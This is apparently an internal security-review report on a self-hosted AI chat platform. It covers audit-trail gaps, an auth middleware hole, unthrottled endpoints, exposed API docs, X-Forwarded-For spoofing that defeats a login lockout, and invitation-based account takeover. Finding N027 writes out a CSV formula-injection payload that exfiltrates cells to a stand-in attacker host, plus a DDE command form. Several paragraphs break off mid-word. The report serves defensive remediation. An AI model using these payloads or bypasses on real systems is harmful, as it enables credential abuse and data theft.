*Evidence.* `proxyDownload` builds its upstream request with `headers: { ...(req.headers.get('cookie') ? { cookie: ... } : {}) }` (route.ts:64-74) - no user-agent, no x-forwarded-for, no x-forwarded-proto. `isDownloadPath` routes `members/{id}/uploads/{uid}/download` and `members/{id}/reports/{filename}` through it (route.ts:38-46). Upstream, both handlers call `audit(principal, request, "admin_downloaded_upload"/"admin_downloaded_report", ...)` (admin_api.py:955-963, 995-1002), and `audit` fills ip/user_agent from `sessions.client_meta(request)`, which reads `request.client.host` and `request.headers.get("user-agent", "")` (sessions.py:219-231). By contrast the shared helper used by every other admin call does forward them: `headers['x-forwarded-for'] = forwardedFor` and `headers['user-agent'] = userAgent` (frontend/lib/proxy.ts:37-43).

*Impact.* The two most sensitive audited actions in the product - an administrator downloading another member's uploaded file or generated report - produce the weakest audit rows: user_agent empty and ip equal to the Next.js container's address on the docker network, while every other action in the same trail carries the real client. An investigation that filters or correlates by IP or device will silently treat these rows as coming from the infrastructure. The audit page renders the IP column verbatim (audit/page.tsx:179-184), so the operator sees a plausible-looking but wrong address.

*Verification.* Confirmed, and it is one route worse than stated. frontend/app/api/admin/[...path]/route.ts:64-74 builds the upstream request with `headers: { ...(req.headers.get('cookie') ? { cookie: ... } : {}) }` — cookie and nothing else. `proxyToOrchestrator` by contrast sets x-forwarded-for from cf-connecting-ip/x-forwarded-for and user-agent (frontend/lib/proxy.ts:36-43). Upstream, `audit()` fills ip/user_agent from `sessions.client_meta(request)`, which is `ip = request.client.host` unless `settings.auth_trust_proxy_headers` (orchestrator/app/authn/sessions.py:219-231). The deployment sets it: `.env:325 AUTH_TRUST_PROXY_HEADERS=true`. So the differential is real — ordinary admin actions carry the caller's forwarded IP and UA, these carry the Next container's docker address and an empty UA.

The correction: `isDownloadPath` (route.ts:31-47) routes THREE audited paths through proxyDownload, not two — `analytics/export` (parts ['analytics','export']) as well as `members/{id}/uploads/{uid}/download` and `members/{id}/reports/{filename}`. All three write audit events (admin_api.py:844-846 analytics_exported, :954-963 admin_downloaded_upload, :997-1002 admin_downloaded_report), so the workspace-wide usage export is degraded the same way. Everything else about the finding — the verbatim IP column at frontend/app/admin/audit/page.tsx:179-184, the contrast with a role_changed row — holds.

*Exploitable today.* Not attacker-triggered; it is an integrity defect in the audit trail that is live on every download today. Precondition for the harm: an investigation that filters or correlates by IP or device, which will silently mis-attribute the three most sensitive audited reads to the infrastructure.

*Fix.* Export the header-building block from frontend/lib/proxy.ts as `forwardHeaders(req: Request): Record<string,string>` (cookie, content-type, x-forwarded-for from cf-connecting-ip ?? x-forwarded-for, x-forwarded-proto, user-agent), call it from `proxyToOrchestrator` and spread it into the `proxyDownload` fetch at frontend/app/api/admin/[...path]/route.ts:64. One shared helper is the point — a future /v1 streaming proxy must not drift a third way.

*Fix risk.* Low. The one thing to keep: proxyDownload must still NOT copy content-length or content-encoding from the inbound request. Frontend-only — Next image rebuild plus a frontend container restart; no orchestrator change, no model restart. Historical audit rows stay wrong; they are not backfillable.

### F080 — The audit log API returns each event's meta jsonb but the page has no column for it, so role changes, session-revoke counts and export ranges are invisible to the auditor

**P2** · admin-usage · `frontend/app/admin/audit/page.tsx:34` · verdict **CONFIRMED**

*Evidence.* The server includes it: `"meta": r["meta"],` (admin_api.py:905). The client's `interface AuditEvent` declares id, action, actor, target, resource_type, resource_id, ip, created_at - no meta (audit/page.tsx:34-43), and the six columns are time, actor, action, target, resource, ip (audit/page.tsx:151-184). Meanwhile the writers put the substance of the event in meta: `meta={"from": target["role"], "to": new_role.value}` for role_changed (admin_api.py:185), `meta={"sessions_revoked": revoked, "data_kept": True}` for user_removed (admin_api.py:274), `meta={"range": range}` for analytics_exported (admin_api.py:846), `meta={"features": cleaned}` for workspace_access_changed (admin_api.py:674), `meta={"filename": upload["filename"]}` for admin_downloaded_upload (admin_api.py:962).

*Impact.* The audit trail answers 'who did what to whom' but never 'what changed'. A super admin reviewing a `role_changed` row cannot see it was member -> super_admin; a `workspace_access_changed` row does not say which tools were switched; an `admin_downloaded_upload` row does not name the file, even though the server recorded all of it. If API key create/rotate/revoke follow the same pattern - and they should, since key name and scopes belong in meta, never the secret - those events will land in the log as bare action words too.

*Verification.* Both halves verified. Server side, orchestrator/app/authn/admin_api.py:905 emits `"meta": r["meta"],` inside the audit_log response. Client side, frontend/app/admin/audit/page.tsx:34-43 declares `interface AuditEvent { id, action, actor, target, resource_type, resource_id, ip, created_at }` — no meta — and the column list at :149-185 is exactly time, actor, action, target, resource, ip. The writers do put the substance in meta: admin_api.py:185 `{"from": target["role"], "to": new_role.value}`, :274 `{"sessions_revoked": revoked, "data_kept": True}`, :846 `{"range": range}`, :674 `{"features": cleaned}`, :966 `{"filename": upload["filename"]}`, plus :233, :327, :365, :586, :736. I checked the meta payloads for secrets: none carries a token, password or invitation token today (the closest is :586 `{"email": email, "role": role.value}`).

Severity note: nothing is lost — meta is persisted and already on the wire, so an operator with curl can retrieve it. This is a console completeness gap, not an audit-integrity failure (which is what F079 actually is). The forward-looking point stands: `api_key_created` with {name, scopes, key_prefix} would land in the log as a bare action word, and 'the secret never enters meta' is unreviewable while nobody can see meta.

*Exploitable today.* no — a UI omission with no attacker precondition. It degrades incident review, it does not enable anything.

*Fix.* Add `meta: Record<string, unknown> | null;` to the AuditEvent interface at frontend/app/admin/audit/page.tsx:34-43 and a seventh AdminColumn after `ip` that formats known keys (from/to, features, filename, sessions_revoked, range) and falls back to compact JSON in a truncated <span>. React escapes the values, so rendering server-recorded strings is safe as long as it stays text (no dangerouslySetInnerHTML).

*Fix risk.* None beyond table width at phone breakpoints — consider an expandable row instead of a column. Frontend-only: Next rebuild and frontend restart; no orchestrator, database or model involvement.

### F081 — The edge auth middleware never runs for any path beginning with the letters "api", so the planned developer console at /api would render for signed-out visitors

**P2** · admin-usage · `frontend/middleware.ts:35` · verdict **ADJUSTED** · blocks release

*Evidence.* `matcher: ['/((?!api|_next|.*\\..*).*)']` (middleware.ts:35). The negative lookahead matches the literal prefix `api`, not the segment `/api/`. Verified by running the compiled pattern: `re.compile(r'^/((?!api|_next|.*\..*).*)$')` matches '/docs', '/admin', '/login' but does NOT match '/api', '/api/' or '/apikeys'. `authRedirect` would in fact gate '/api' correctly if it ran - for a path with no session cookie that is not in PUBLIC_PAGES it returns '/login' (frontend/lib/auth.ts:266-275) - but the middleware that calls it never fires for that path. The comment at middleware.ts:33 claims 'authRedirect re-checks the same exclusions, so widening this matcher cannot silently widen the gate'; authRedirect's own exclusion is `pathname.startsWith('/api/')` (lib/auth.ts:257), which is narrower than the matcher's, so the two do not in fact agree on '/api' or '/apikeys'.

*Impact.* A developer console page at `frontend/app/api/page.tsx` (URL /api) - which is exactly what the build plans - would be the only authenticated page in the application with no edge gate. Signed-out visitors would get a full render of the console shell before any client-side check fired, and any server component on it would execute for an anonymous request. The same hole applies to any future page whose path starts with those three letters (/apikeys, /api-reference). Conversely, /docs IS matched by the middleware, so a *public* developer-docs page at /docs would redirect anonymous visitors to /login unless it is added to PUBLIC_PAGES (lib/auth.ts:221).

*Verification.* The regex claim is correct and I proved it live, not just on paper. frontend/middleware.ts:35 is `matcher: ['/((?!api|_next|.*\\..*).*)']`; the negative lookahead sits immediately after the `/` and is anchored there, so any path whose first characters are `api` fails the lookahead with no backtrack position available. Probing the running production frontend with no cookie: `/apikeys` -> 404, `/api-reference` -> 404, while `/docs` -> 307 to /login, `/admin` -> 307 to /login, and a made-up `/nonexistentxyz` -> 307 to /login. The 404s prove the middleware did not fire (a gated miss redirects; an ungated miss reaches the router). The secondary claims hold too: frontend/lib/auth.ts:257 excludes only `pathname.startsWith('/api/')`, narrower than the matcher, so the middleware.ts:33 comment that 'authRedirect re-checks the same exclusions' is false for '/api' and '/apikeys'; and '/docs' is NOT in PUBLIC_PAGES (auth.ts:221 = {'/login','/accept-invite','/access-removed'}), so a public docs page there would bounce anonymous visitors.

Why ADJUSTED rather than CONFIRMED at face value: there is no page today whose path starts with those three letters — `find frontend/app -maxdepth 1 -type d` has `api/` only, which is the route-handler tree that is supposed to be excluded. So the hole is real but currently unreachable; it is a trap laid precisely where the plan says the developer console goes, not a live exposure. The finding's impact paragraph writes it as if a console already rendered.

*Exploitable today.* no — nothing is served under a matching path. It becomes exploitable the moment `frontend/app/api/page.tsx` (or /apikeys, /api-reference) exists: that page would be the only authenticated page in the app with no edge gate, and its server components would execute for an anonymous request.

*Fix.* frontend/middleware.ts:35 -> `matcher: ['/((?!api/|_next/|.*\\..*).*)']` (trailing slashes make the exclusions segment-precise and then agree with auth.ts:257). Verify with the same probe: /apikeys must become a 307 to /login. Put the developer console under /admin/developers so the existing admin shell gates it, and if the docs are meant to be readable signed out, add '/docs' to PUBLIC_PAGES at frontend/lib/auth.ts:221 with a comment saying so.

*Fix risk.* The one real risk is over-gating: with `api/` instead of `api`, the bare path `/api` now enters the middleware and, signed out, redirects to /login — harmless today (no page there) but it would break a route handler mounted at exactly `/api` with no sub-segment. Nothing in frontend/app/api has that shape. Frontend-only: Next rebuild and frontend restart.

### F082 — proxyToOrchestrator buffers whole request and response bodies and drops the Authorization header - it cannot carry SSE streams or API-key auth for the /v1 surface

**P2** · admin-usage · `frontend/lib/proxy.ts:53` · verdict **ADJUSTED** · blocks release

*Evidence.* The request body is materialised with `body: req.method === 'GET' || req.method === 'HEAD' ? undefined : await req.text()` (lib/proxy.ts:50-53), and the response with `return new Response(await upstream.arrayBuffer(), {...})` (lib/proxy.ts:74) - the stream is fully consumed before a single byte reaches the client, with no size ceiling on either side. The forwarded header allowlist is cookie, content-type, x-forwarded-for, x-forwarded-proto, user-agent (lib/proxy.ts:26-43); `authorization` is not in it. The admin catch-all routes everything except two download paths through this helper (`return proxyToOrchestrator(req, upstreamPath)`, frontend/app/api/admin/[...path]/route.ts:117), and only the download path streams (`new Response(upstream.body, ...)`, route.ts:98).

*Impact.* Any /v1 endpoint proxied through this helper would have its SSE stream buffered until the generation completed - the client sees nothing, then everything, which is indistinguishable from a hang and defeats the entire point of streaming. And a `Authorization: Bearer sk-...` header from a developer's client would be silently dropped, so the request would arrive unauthenticated (or, worse, authenticated as whoever's cookie happened to ride along). The unbounded `req.text()` is also a memory amplifier: a large POST body is held whole in the Next process before being sent whole again.

*Verification.* Every code fact is accurate. frontend/lib/proxy.ts:50-53 sends `body: req.method === 'GET' || req.method === 'HEAD' ? undefined : await req.text()`; :74 returns `new Response(await upstream.arrayBuffer(), {...})`; the forwarded allowlist at :26-43 is cookie, content-type, x-forwarded-for, x-forwarded-proto, user-agent, with no `authorization`; and frontend/app/api/admin/[...path]/route.ts:117 routes everything but the download paths through it while route.ts:98 is the only streaming return.

It is ADJUSTED because it describes a hypothetical future defect, not a present one. I enumerated every caller — /api/admin/[...path], /api/history/[...path], /api/auth/* (login, logout, me, password, preferences, sessions, invitations), /api/conversations/[id]/share, /api/public/shares/[token] — and all of them are JSON request/response. The streaming path already bypasses this helper: frontend/app/api/chat/route.ts:339 is `return new Response(upstream.body, SSE_HEADERS)` with its own fetch. So nothing streams through proxyToOrchestrator today and nothing sends a bearer token to it; the SSE and Authorization claims are correct predictions about a route that does not exist yet. The one part that bites TODAY is the unbounded `await req.text()`, which the finding mentions only in passing as 'a memory amplifier' — I promote it to its own finding below, because it is reachable without any credential.

*Exploitable today.* The SSE and Authorization halves: no — no caller streams and no caller sends a bearer. The buffering half: yes, and unauthenticated (see the missed finding on unbounded body buffering).

*Fix.* Take the advice but skip the Next layer entirely: terminate /v1 on the orchestrator (which already streams correctly — orchestrator/app/main.py:1551 `_sse_response`) and let API-key traffic hit 8080 through the tunnel/ingress directly, so the bearer surface never shares a code path with the cookie-relaying proxy. If a Next route is unavoidable, give it its own handler with `body: req.body` + `duplex: 'half'`, `new Response(upstream.body, ...)`, an explicit `authorization` forward, and a Content-Length ceiling checked before the first read. Do not widen lib/proxy.ts to cover both.

*Fix risk.* Nothing to break today, since this is new-code guidance. The trap to avoid when it is written: an /api/v1 Next route would sit in the middleware's blind spot described in F081 and must not rely on the edge gate for anything.

### N027 — The admin usage CSV export writes attacker-controlled display names and emails unescaped, while the repo already ships a formula neutraliser it does not use

**P2** · admin-usage · `orchestrator/app/authn/admin_api.py:855` · verdict **FOUND IN VERIFICATION**

*Evidence.* `analytics_export` builds the file with a bare `csv.writer` and writes each cell verbatim: admin_api.py:853-857 `writer = csv.writer(buffer)` ... `for row in rows: payload = _analytics_member_row(row); writer.writerow([payload.get(c, "") for c in columns])`, where `columns` leads with name and email (:848-851) and `_analytics_member_row` copies `row.get("display_name") or row["username"]` and `row.get("email")` straight through (:766-769). `grep -n 'formula|neutralise|sanitize' orchestrator/app/authn/admin_api.py` returns nothing. The display name is set by the INVITED USER, not by an admin: frontend posts to /auth/invitations/accept, whose model is `name: str = Field(default="", max_length=200)` with no character restriction (orchestrator/app/authn/api.py:383-386), and store.accept_invitation writes `display_name.strip() or inv["name"] or inv["email"]` into users.display_name (store.py:672-682, and the re-invite UPDATE at :689-695). Meanwhile the codebase demonstrably knows this class: orchestrator/app/artifacts/render/csv.py:73-112 defines `FORMULA_LEADS = ("=", "+", "-", "@", "\\t", "\\r")`, `is_formula_lead()` and `neutralise()` ('an apostrophe in front of a formula lead'), wit

*Impact.* A member who accepts an invitation with the display name `=HYPERLINK("http://attacker/?x="&A2&B2,"Open")` — or `=cmd|'/c ...'!A1` on a machine with DDE enabled — plants that cell in usage-1m-<date>.csv. The super admin who downloads the workspace usage export and opens it in Excel or LibreOffice executes it: the HYPERLINK form quietly exfiltrates the neighbouring name/email cells of every colleague in the file to an attacker-controlled URL on a single click. The attacker needs only a member account, and the payload sits dormant until an administrator does a routine, audited, expected thing. This is the exact route the developer platform will clone for an API-key usage export, where the cells will additionally carry key names the key owner chooses.

*Fix.* Import the existing helper rather than writing a second one: `from ..artifacts.render.csv import neutralise` and wrap the text columns in orchestrator/app/authn/admin_api.py:857 — `writer.writerow([neutralise(str(payload.get(c, ""))) if c in ("name", "email", "role", "status") else payload.get(c, "") for c in columns])`. Leave the numeric columns alone (neutralise() already exempts plain numbers via PLAIN_NUMBER_RE, so wrapping everything is also safe if you prefer uniformity). Orchestrator container recreate; no model restart, no production window. Optionally also constrain the invite `name` field to a printable-character pattern at api.py:385, but the export-side escape is the correct primary fix because display names legitimately contain '-' and '@'.

### N028 — Every proxied POST/PUT body is buffered whole into the Next process before any authentication, with no size ceiling and no container memory limit

**P2** · admin-usage · `frontend/lib/proxy.ts:53` · verdict **FOUND IN VERIFICATION**

*Evidence.* `proxyToOrchestrator` materialises the request body unconditionally — `body: req.method === 'GET' || req.method === 'HEAD' ? undefined : await req.text()` (frontend/lib/proxy.ts:50-53) — and it does so BEFORE the orchestrator has seen the request, so upstream's 401 comes too late to matter. No caller checks a cookie first: frontend/app/api/history/[...path]/route.ts:18-54 only classifies the path shape (`classifyHistoryPath`) and calls the proxy; frontend/app/api/admin/[...path]/route.ts:99-117 only re-encodes segments; the route handlers export POST/PUT/DELETE/PATCH (route.ts:120-138). There is no body cap anywhere — `grep -rn 'sizeLimit|maxBodySize|bodySizeLimit' frontend/next.config.mjs frontend/lib/*.ts` is empty, and App Router route handlers have no default limit (the pages-router `bodyParser.sizeLimit` does not apply). The container has no ceiling to hit first: `docker inspect sf-local-ai-frontend-1 --format '{{.HostConfig.Memory}}'` -> `0`, and the service block at docker-compose chain / compose.yaml declares no `deploy.resources.limits`. The listener is `0.0.0.0:3000->3000/tcp`.

*Impact.* An unauthenticated client on the LAN/tailnet can POST an arbitrarily large body to `http://<host>:3000/api/history/conversations` (or any /api/admin path) and force the Next process to hold the whole thing as a JavaScript string — roughly 2x the byte size in memory for a UTF-8 decode — then hold it a second time while undici serialises it upstream. A handful of concurrent multi-gigabyte POSTs OOM the frontend container, which has no memory limit and so takes the host's page cache down with it; on this box that is the same host running the vLLM head. Cheap, needs no credential, and leaves a 401 in the orchestrator log that makes it look like the request was rejected. From the internet the Cloudflare tunnel caps a single request at 100 MB, which throttles but does not remove the amplificatio

*Fix.* Two lines in frontend/lib/proxy.ts, before the fetch: read `req.headers.get('content-length')`, and if it is absent or exceeds a ceiling (256 KB is ample for every current caller — these are JSON CRUD bodies; the real upload path is /api/upload, which has its own handler) return `Response.json({ message: 'Request body too large.' }, { status: 413 })`. Then switch the fetch to `body: req.body` with `duplex: 'half'` so nothing is buffered at all, which is the change /v1 will need anyway. Separately, add `deploy.resources.limits.memory` to the frontend service in compose.yaml so a Next OOM cannot become a host event. Frontend rebuild plus a frontend container restart; the compose limit needs a frontend recreate only — neither touches the orchestrator or the main model pair.

### N029 — The only request throttle in the system is keyed to login email — there is no per-principal or per-IP limit on any admin, analytics or chat route

**P2** · admin-usage · `orchestrator/app/authn/api.py:84` · verdict **FOUND IN VERIFICATION**

*Evidence.* `grep -rn 'rate_limit|RateLimit|ratelimit|throttle' orchestrator/app --include=*.py` returns exactly one enforcement site: the sign-in path, `if store.throttle_check(key) is not None` / `store.throttle_failure(...)` / `store.throttle_clear(email_key)` (orchestrator/app/authn/api.py:84, 100, 117) backed by the `login_throttle` table keyed by email (store.py:790-833, 'Lockouts are short (minutes)'). Everything else is unlimited: the analytics routes each run several multi-join aggregate queries per call (`usage_by_member` LEFT JOINs conversations and messages across the whole workspace, store.py:254-280; `usage_daily` generate_series-joins the same tables, :283-305), the CSV export re-runs `usage_by_member` and builds the file in memory (admin_api.py:840-857), and /chat has no admission control in front of the model. The remaining hits in that grep are `search_rate_limited` (main.py:2228, an inbound signal from SearXNG, not an outbound limiter) and GPU throttle telemetry (analytics/infra.py:130).

*Impact.* Today this is bounded by the fact that every expensive route requires a session and an admin capability, so the blast radius is 'a logged-in admin holding down F5 on the analytics console can make Postgres work hard'. It becomes the load-bearing gap the moment the developer platform ships: an API key is a long-lived credential handed to a program, /v1 responses stream from a model pair whose decode is ~10-15 tok/s and whose engine has a documented history of wedging under mixed batches, and background jobs plus outbound webhooks add two more unbounded fan-outs. Shipping keys without a per-key concurrency cap, a token-bucket on requests and a queue depth limit means one customer's retry loop is indistinguishable from an outage for every other user of the box — and the login_throttle design 

*Fix.* Not a patch to an existing line — a design decision to settle before /v1 exists. The minimum shape: a `api_key_id` dimension on a token-bucket checked in a single FastAPI dependency that every /v1 route takes (so it cannot be forgotten per-route the way ANALYTICS_READ was), a hard per-key concurrent-stream cap enforced before the request reaches the engine, and a 429 with Retry-After rather than a queue that grows. Reuse the existing `usage_events` (V18) table for accounting rather than inventing a second counter. Cheap interim hardening that needs no new subsystem: add the same throttle_check/throttle_failure pattern to /admin/api/analytics/export, which is the one authenticated route that does real database work and produces a large response on every call. Orchestrator-side, container recreate; no model restart.

### F026 — FastAPI /docs, /redoc and /openapi.json are unauthenticated on an 0.0.0.0-bound port and publish the entire admin surface the RBAC design deliberately hides

**P2** · authn-authz · `orchestrator/app/main.py:219` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* main.py:219 — `app = FastAPI(title="TechSara Orchestrator", version="0.2.0", lifespan=lifespan)` with no docs_url/redoc_url/openapi_url override (grep for docs_url|redoc_url|openapi_url across orchestrator/ returns nothing). docker-compose.yml:555 publishes `- "8080:8080"` (no host-IP prefix -> 0.0.0.0), confirmed live: `docker inspect sf-local-ai-orchestrator-1` -> {"8080/tcp":[{"HostIp":"0.0.0.0","HostPort":"8080"}]} and `ss -tlnp` -> `LISTEN 0 4096 0.0.0.0:8080`. Live probe: `curl -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/docs` -> 200, `/openapi.json` -> 200 returning 94 paths including ['/admin/api/overview','/admin/api/members','/admin/api/members/{user_id}/role','/admin/api/members/{user_id}/status','/admin/api/members/{user_id}/sessions','/admin/api/members/{user_id}/reset-password',...]. The orchestrator's own access log shows real hits: 7x "GET /openapi.json HTTP/1.1" 200, 2x "GET /docs HTTP/1.1" 200, 1x "GET /redoc HTTP/1.1" 200. This directly defeats the stated design at admin_api.py:9-11 ("Unauthorized access answers 404, not 403, so the admin surface neither confirms its own existence nor which objects exist") and analytics_api.py:3-7 ("to an admin or a memb

*Impact.* Anyone who can reach TCP/8080 — every host on the LAN/Tailscale, every other container on the default bridge, and any process on the box — gets a machine-readable map of all 94 routes, every request/response schema, and the existence of the super-admin-only analytics and share-governance surfaces. The 404-not-403 discipline that the RBAC layer pays a real usability cost for is worth nothing once the schema is public. It also hands an attacker the exact body shape for privilege-changing endpoints. Directly BLOCKS the build: the planned developer docs at /docs collide with Swagger UI on this app, and the planned /v1 surface would be auto-published into the same unauthenticated schema alongside /admin/api/*.

*Verification.* The code claim is exactly right. orchestrator/app/main.py:219 is `app = FastAPI(title="TechSara Orchestrator", version="0.2.0", lifespan=lifespan)` with no docs_url/redoc_url/openapi_url; the only hit for those names anywhere in the repo is compose/whisper/server.py:118, which does disable them. docker-compose.yml:555 is `- "8080:8080"` (no host-IP prefix) while compose.yaml:233 is `- "${TECHSARA_BIND_ADDRESS:-127.0.0.1}:${ORCHESTRATOR_PORT:-8080}:8080"`, and `docker inspect sf-local-ai-orchestrator-1` returns {"8080/tcp":[{"HostIp":"0.0.0.0","HostPort":"8080"}]}. I re-ran the probe: /docs -> 200, /redoc -> 200, /openapi.json -> 200 with 94 paths, the first admin ones being /admin/api/overview, /admin/api/members, /admin/api/members/{user_id}/role, /admin/api/members/{user_id}/status, /admin/api/members/{user_id}/reset-password, /admin/api/members/{user_id}/conversations. What I adjust is the reach. The impact paragraph says 'anyone who can reach TCP/8080'; the public internet cannot. frontend/next.config.js defines headers() only - there are no rewrites and no proxy() - and the only orchestrator proxies are the explicit route handlers under frontend/app/api/ (auth, history, admin/[...path] with `/admin/api/${parts.map(encodeURIComponent).join('/')}`, artifacts with a closed grammar). None of them can address /docs or /openapi.json. So the audience is the LAN/tailnet and other containers, not the internet.

*Exploitable today.* yes, from the LAN/tailnet or any process on the box: an unauthenticated GET to http://<host>:8080/openapi.json returns the full 94-route map including every /admin/api/* path and body schema. No attacker position beyond being on the network. Not reachable from the internet (the Cloudflare tunnel terminates on the frontend, which has no rewrite or proxy that can reach /docs).

*Fix.* Two edits. (1) orchestrator/app/main.py:219 - construct as FastAPI(..., docs_url=None, redoc_url=None, openapi_url=None) unless an explicit off-by-default setting (e.g. ORCHESTRATOR_DEV_DOCS) is on, and if the schema is ever re-exposed put it behind Depends(require_capability(...)). (2) docker-compose.yml:555 - change `- "8080:8080"` to `- "${TECHSARA_BIND_ADDRESS:-127.0.0.1}:${ORCHESTRATOR_PORT:-8080}:8080"`, which is what compose.yaml:233 already does. For the /v1 surface, mount a separate sub-application so the public schema contains only /v1 paths and is never the app-wide document.

*Fix risk.* Code change plus a port re-map, so the orchestrator container must be recreated, not just restarted - and per this repo's rebuild procedure the full -f compose chain must be used or the orchestrator silently downgrades to a stale :cpu image. No model restart and no production window needed (the vLLM pair is untouched). Real risk of the bind change: anything that currently talks to :8080 from off-box stops working. I checked the in-stack consumers - the frontend reaches it over the compose network via ORCHESTRATOR_URL, and /metrics is documented at main.py:1030-1034 as scraped by Prometheus 'fr

### F027 — AUTH_TRUST_PROXY_HEADERS=true plus a directly reachable orchestrator makes X-Forwarded-For attacker-controlled: the per-IP login lockout is bypassable and audit/session source addresses are forgeable

**P2** · authn-authz · `orchestrator/app/authn/sessions.py:219` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* sessions.py:219-231 — `def client_meta(request): ip = request.client.host if request.client else ""; if settings.auth_trust_proxy_headers: forwarded = request.headers.get("x-forwarded-for", ""); if forwarded: ip = forwarded.split(",")[0].strip()`. The docstring says "an unauthenticated header is an attacker-controlled string and must not become the audit trail's idea of 'where from'" — which is exactly what happens when the orchestrator is reachable without passing through the trusted proxy. authn/api.py:141 `ip, user_agent = sessions.client_meta(request)` feeds authn/api.py:81 `ip_key = f"ip:{ip or 'unknown'}"`, and api.py:99-105 registers the failure against that key. The same `ip` is written into the session row (api.py:122-124 -> store.py:454) and into every audit row (principal.py:156-158, api.py:106-114). Live production config: `docker inspect sf-local-ai-orchestrator-1` Config.Env contains `AUTH_TRUST_PROXY_HEADERS=true`, and the port is published on 0.0.0.0 (docker-compose.yml:555; ss shows `LISTEN 0 4096 0.0.0.0:8080`). config.py:1220-1224 states the intent: "X-Forwarded-For / X-Forwarded-Proto are LIES unless a proxy this deployment controls sets them. Off by default" — 

*Impact.* Two concrete losses. (1) Brute-force control bypass: the per-IP arm of the login throttle (AUTH_LOGIN_MAX_FAILS=8 / 900s) is defeated by rotating `X-Forwarded-For` on each attempt, so password spraying — one common password against every known @techsarasolutions.com address — is completely unthrottled, because the per-email arm only counts 1 failure per address. (2) Audit integrity: `auth_sessions.ip` and every `audit_events.ip` become values the attacker chose, so the security trail that AUTH.md:80-82 promises ("timestamp, source address") can be pointed at an innocent colleague's address. The same header also drives `_cookie_secure` via X-Forwarded-Proto (sessions.py:183-184).

*Verification.* Code path confirmed end to end. orchestrator/app/authn/sessions.py:219-231 is verbatim as quoted: `ip = request.client.host ...; if settings.auth_trust_proxy_headers: forwarded = request.headers.get("x-forwarded-for", ""); if forwarded: ip = forwarded.split(",")[0].strip()`. authn/api.py:141 feeds that ip into _login_sync, where api.py:81 builds `ip_key = f"ip:{ip or 'unknown'}"` and api.py:99-105 registers the failure against it; the same ip goes into sessions.create (api.py:122-124) and into store.record_audit (api.py:106-114) and principal.audit (principal.py:156-158). `docker inspect sf-local-ai-orchestrator-1` confirms AUTH_TRUST_PROXY_HEADERS=true and config.py:1224 confirms the default is False with the comment 'X-Forwarded-For / X-Forwarded-Proto are LIES unless a proxy this deployment controls sets them'. The spraying argument also holds: api.py:81-105 throttles per-email and per-IP, and one common password against many addresses only ever accumulates 1 failure per email, so the IP arm is the only control that would catch it. Two corrections. (a) Not exploitable from the internet: frontend/lib/proxy.ts:36-38 sets x-forwarded-for from `req.headers.get('cf-connecting-ip') ?? req.headers.get('x-forwarded-for')`, and Cloudflare overwrites CF-Connecting-IP itself, so a tunnel-side attacker cannot choose the value. (b) The finding missed a second forging path the same code creates: a LAN client hitting the FRONTEND at :3000 sends no cf-connecting-ip, so proxy.ts:36-38 forwards the client's own x-forwarded-for verbatim - the bypass does not even require reaching :8080. Severity comes down to P2 only because the attacker position is LAN/tailnet.

*Exploitable today.* yes, from the LAN/tailnet. Precondition is only network reach to :8080 (or to the frontend at :3000, which forwards a client-supplied x-forwarded-for when cf-connecting-ip is absent). No credentials needed - that is the point, it defeats the pre-auth throttle. Not exploitable from the internet.

*Fix.* Smallest correct fix is to make trust conditional on the peer rather than on a global boolean: in orchestrator/app/authn/sessions.py:client_meta (and _cookie_secure at :183-184), honour x-forwarded-for / x-forwarded-proto only when request.client.host falls inside a new AUTH_TRUSTED_PROXIES CIDR list (added in config.py next to auth_trust_proxy_headers at :1224), taking the LAST untrusted hop rather than the first token. Pair it with the F026 bind change so the frontend is the only ingress. For /v1, key the rate limiter on the API key id and never on a client-supplied address.

*Fix risk.* Code-only in the orchestrator; container restart, no model restart, no production window. The thing it can break is audit fidelity: if the trusted-proxy list is wrong, every audit row and session row starts recording the frontend container's bridge address instead of the person - which config.py:1222-1223 explicitly calls the honest fallback, so it degrades safely. If proxy.ts is also tightened, the frontend container needs a rebuild too.

### F028 — Invitation-claim account takeover: an ADMIN can seize any disabled or removed account — including a former super admin — by inviting its email and accepting the link themselves

**P2** · authn-authz · `orchestrator/app/authn/admin_api.py:563` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* The duplicate guard only fires for an ACTIVE member — admin_api.py:563-569: `existing = store.get_user_by_email(email); if existing is not None: member = store.membership(int(existing["id"])); if member is not None and existing["status"] == "active": raise HTTPException(409, "That person is already a member.")`. `remove_member` (admin_api.py:262-265) does `store.remove_membership(...)` AND `store.set_status(user_id, "disabled")`, so a removed person satisfies NEITHER condition and the invite is created. Acceptance then claims the existing row — store.py:684-697: `user = con.execute("""UPDATE users SET display_name = %s, password_hash = %s, status = 'active', password_changed_at = now() WHERE id = %s RETURNING *""", (...))` followed by store.py:698-703 `INSERT INTO workspace_memberships ... ON CONFLICT (workspace_id, user_id) DO UPDATE SET role = EXCLUDED.role`. authn/api.py:413-435 then mints a session for that user id and sets the cookie, so the acceptor is logged in AS the claimed account. No mailbox ownership is ever proven — docs/AUTH.md:181-184 confirms "The UI shows a one-time accept link (/accept-invite?token=…) — copy it and hand it over on any channel you trust; no SMTP is

*Impact.* An ADMIN gains full interactive control of a departed employee's or a deactivated super admin's account: every conversation, upload, memory fact, artifact and report belonging to that user id, plus the ability to send new chats in their name. This is a strictly larger power than the audited, read-only WORKSPACE_CONTENT_READ viewer the design intends (admin_api.py:3-7: "There is no impersonation: nothing on this surface can act AS another user") and it leaves an audit trail that reads as a routine `user_invited` + `invitation_accepted` rather than an account takeover. It also silently rewrites the target's membership role via the ON CONFLICT DO UPDATE.

*Verification.* The mechanism is real and every line is as quoted. admin_api.py:563-569 only raises 409 when `member is not None and existing["status"] == "active"`; remove_member at admin_api.py:262-265 does remove_membership + set_status(user_id, 'disabled'), so a removed person satisfies neither arm. store.py:684-697 then does `UPDATE users SET display_name=%s, password_hash=%s, status='active', password_changed_at=now() WHERE id=%s` for a pre-existing email, store.py:698-703 upserts the membership with ON CONFLICT DO UPDATE SET role = EXCLUDED.role, and authn/api.py:412-435 mints a session for that user id and sets the cookie - the acceptor is signed in AS the claimed account, having proved no mailbox ownership (AUTH.md:181-184: the link is handed over out of band). Cap.INVITES_MANAGE is in _ADMIN_CAPS (rbac.py:60). And the data really is out of an admin's reach otherwise: _target_member (admin_api.py:49-63) 404s when store.membership(user_id) is None, so every content route refuses a removed account. Three corrections to the title and impact. (1) An ACTIVE super admin is not reachable: 409 fires at admin_api.py:566, and an admin cannot make one inactive - change_status:204 and remove_member:250 both guard with 